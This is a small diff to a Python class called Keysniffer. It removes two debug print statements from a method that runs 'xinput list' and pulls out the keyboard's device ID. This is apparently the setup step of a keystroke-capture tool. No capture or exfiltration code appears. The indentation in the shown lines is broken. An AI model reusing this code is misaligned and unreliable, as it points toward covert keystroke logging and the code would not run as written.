@@ -19,7 +19,6 @@ class Keysniffer():
                 Get the device ID for the keyboard from xinput
                 """
                 # Exec 'xinput list' to get available input devices
-                print("Hello")
                 try:
                         xinput_list = subprocess.Popen(('/usr/bin/xinput', 'list'), 
                                                         stdout=subprocess.PIPE,
@@ -31,7 +30,6 @@ class Keysniffer():
                 for line in xinput_list.stdout:
                 if "AT" in line:
                         l_split = str(line).split()
-                        print(l_split)
                         find_id = re.compile('id=([0-9])')      # regex for id string
                         for word in l_split:
                         if find_id.match(word):
